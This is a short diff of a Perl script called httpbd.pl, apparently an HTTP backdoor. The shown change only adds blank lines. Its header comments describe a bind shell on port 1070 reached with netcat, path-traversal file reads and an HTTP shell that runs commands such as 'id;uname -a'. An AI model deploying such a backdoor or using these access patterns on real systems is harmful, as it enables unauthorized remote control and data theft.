@@ -1,5 +1,6 @@
 #usr/bin/perl
 
+
 # httpbd.pl Usage:
 # 1. bind shell:
 # nc target 1070
@@ -10,6 +11,7 @@
 # http://target:1070/file?../some/file
 # 3. http shell
 # http://target:1070/shell?id;uname -a
+
 
 use Socket;
 
